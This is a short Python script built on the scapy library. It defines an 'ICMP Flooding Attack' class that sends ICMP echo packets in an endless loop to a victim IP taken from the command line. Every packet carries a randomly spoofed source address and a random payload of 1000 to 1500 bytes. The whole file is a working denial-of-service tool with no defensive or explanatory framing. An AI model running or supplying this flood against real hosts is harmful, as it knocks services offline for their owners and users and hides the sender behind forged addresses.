from scapy.all import *
import sys
import random
import string

class ICMPAttacker:
    '''
    ICMP Flooding Attack
    '''

    def attack(self, victim_ip):
        while True:
            a, b, c, d, port = random.randint(100, 255), random.randint(100, 255), random.randint(100, 255), \
                               random.randint(100, 255), random.randint(1024, 60000)
            src_ip = f'{a}.{b}.{c}.{d}'
            ip_layer = IP(src=src_ip, dst=victim_ip, ttl=(1, 100))
            icmp = ICMP(type = 8) # 回显
            random_length = random.randint(1000, 1500)
            payload = ''.join([random.choice(string.digits + string.ascii_letters) for i in range(random_length)])
            packet = ip_layer / icmp / payload
            send(packet)


if __name__ == "__main__":
    target_ip = sys.argv[1]
    attacker = ICMPAttacker()
    attacker.attack(target_ip)

